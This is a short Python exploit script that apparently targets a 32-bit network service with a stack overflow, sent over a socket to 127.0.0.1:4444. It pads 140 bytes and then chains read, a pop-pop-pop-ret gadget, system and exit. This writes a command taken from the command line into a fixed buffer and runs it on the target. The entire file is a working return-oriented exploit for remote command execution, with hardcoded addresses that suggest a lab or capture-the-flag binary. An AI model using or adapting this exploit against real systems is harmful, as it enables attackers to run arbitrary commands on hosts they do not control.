import struct
import socket
import sys
from time import sleep

cmd = sys.argv[1] + "\0"

buffer = 0x08049530
read = 0x0804832c
write = 0x08048442
pppr = 0x080484b6
system = 0xb7e45da0
exit = 0xb7e399d0

payload = "A"*140
payload += struct.pack("<I",read)
payload += struct.pack("<I",pppr)
payload += struct.pack("<I",0)
payload += struct.pack("<I",buffer)
payload += struct.pack("<I",len(cmd))
payload += struct.pack("<I",system)
payload += struct.pack("<I",exit)
payload += struct.pack("<I",buffer)

addr = ("127.0.0.1",4444)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(addr)

s.send(payload)
sleep(1)
s.send(cmd)

print(s.recv(1024))

s.close()



